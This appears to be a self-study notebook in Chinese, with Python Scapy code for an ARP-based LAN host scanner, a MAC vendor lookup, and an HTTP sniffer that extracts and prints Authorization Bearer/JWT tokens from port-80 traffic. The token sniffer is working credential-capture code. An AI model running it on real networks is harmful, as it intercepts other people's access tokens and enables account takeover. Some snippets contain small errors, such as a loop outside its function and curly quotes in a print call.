# 自学笔记：从 RFC 官方文件到 Scapy 的二层实现
# 我在研究 Wireshark 抓包时发现，即使在线节点屏蔽了 Ping (ICMP)，它也必须服从 ARP 协议的“局域网法律”才可以流量交互。
# 为了验证 Lessig "Code is Law" 的理念，我翻阅了 Scapy 官方文档中极简的 'Stacking Layers' 章节。
# 我通过 ls(ARP) 命令摸清了字段，并查阅 RFC 官方文件实测证实了广播地址必须设为 ff:ff:ff:ff:ff:ff。

from scapy.all import ARP, Ether, srp

def arp_scan(ip_range):
    # 准专业工具：局域网活动主机扫描
    # 原理：构造二层以太网帧，封装ARP请求，获取MAC地址
    # 构造以太网广播包
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    # 构造ARP请求包
    arp = ARP(pdst=ip_range)
    # 组合包
    packet = ether/arp

    # 发送并接收响应 (timeout为等待时间，verbose=False隐藏冗余输出)
    result = srp(packet, timeout=3, verbose=False)[0]

    clients = []
    for sent, received in result:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
    
    return clients


from scapy.data import MANUFDB  # MANUFDB 是 Manufacturer Database（厂商数据库）。它的核心作用是把网络设备的 MAC 地址（物理地址）转换成我们可读的厂商名称（比如 Apple, Samsung, Huawei）。 

def get_vendor(mac):
    # Scapy 自带的 OUI 数据库查询
    return MANUFDB.get_manuf(mac)

# 在你原有的循环里调用
for sent, received in result:
    vendor = get_vendor(received.hwsrc)
    clients.append({'ip': received.psrc, 'mac': received.hwsrc, 'vendor': vendor})
# 我关注到 WMN Lab 在无线网路拓扑和安全方面的研究。为了理解网路中节点的物理行为，我参考 RFC 的官方文件使用 Scapy 手写了 ARP 扫描器。
# 我没有依赖高层工具，而是直接操作二层包头，并集成 MANUFDB 来识别异质设备的厂商指纹，以此来模拟实验室环境下的资产发现逻辑。



#我用 Scapy 抓包时，原本看到的是一堆 b'\x47\x45\x54' 这种原始乱码（Raw）。我当时就在想：既然它是 HTTP 请求，肯定有规律。
#通过搜索，我发现只要加一行 import 那个特定的模块（HTTPRequest），这堆乱码就能自动“翻译”成看得懂的 Authorization 字段
from scapy.all import *
from scapy.layers.http import HTTPRequest 

def sniff_tokens(pkt):
    if pkt.haslayer(HTTPRequest):
        url = pkt[HTTPRequest].Host.decode() + pkt[HTTPRequest].Path.decode()
        # 寻找常见的 OAuth 或 JWT 令牌特征
        # 我在抓包实验中发现，现代系统不再直接传密码，而是传一串叫 Bearer Token 的东西。我抓包看到那个字段开头就写着 ‘Bearer’ 这六个字母，
        # 后面跟着一串很整齐的 Base64 编码。我当时觉得这不像乱码，更像是一种加密凭证，所以才去查的。
        # 查资料后我知道这叫 OAuth 协议。它就像酒店的临时房卡，即使被我用 Scapy 截获了，也比截获账号密码要安全一些，因为它可以设置有效期。
        # JWT 令牌，我通过 Scapy 观察流量，我首先识别出 OAuth 框架下的 Authorization: Bearer 授权模式，
        # 随后通过对该字段内容的结构拆解，进一步锁定了采用 JWT 格式封装自带的用户信息，从而验证了应用层授权协议对网络层安全通道的一定依赖性
        auth = pkt[HTTPRequest].fields.get('Authorization')
        if auth:
            print(f”发现敏感令牌！ 目标地址: {url}”)
            print(f"令牌内容: {auth}")

# 监听网卡流量
sniff(filter="tcp port 80", prn=sniff_tokens, store=0)


